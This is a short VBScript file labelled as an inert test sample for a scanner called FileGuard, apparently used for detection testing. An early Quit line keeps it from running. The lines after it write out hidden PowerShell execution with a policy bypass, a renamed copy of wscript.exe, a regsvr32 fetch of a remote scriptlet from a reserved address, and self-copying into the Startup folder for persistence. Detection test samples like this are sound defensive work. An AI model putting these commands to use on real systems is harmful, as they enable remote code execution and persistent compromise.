' FileGuard inert test sample - non-functional, reserved addresses only
WScript.Quit
CreateObject("WScript.Shell").Run "powershell -w hidden -ExecutionPolicy Bypass -File C:\Users\Public\a.ps1", 0
CreateObject("WScript.Shell").Run "cmd /c copy C:\Windows\System32\wscript.exe C:\Users\Public\xenon.exe", 0
CreateObject("WScript.Shell").Run "regsvr32 /s /n /u /i:http://203.0.113.8/s.sct scrobj.dll", 0
CreateObject("Scripting.FileSystemObject").CopyFile WScript.ScriptFullName, CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\u.vbs"
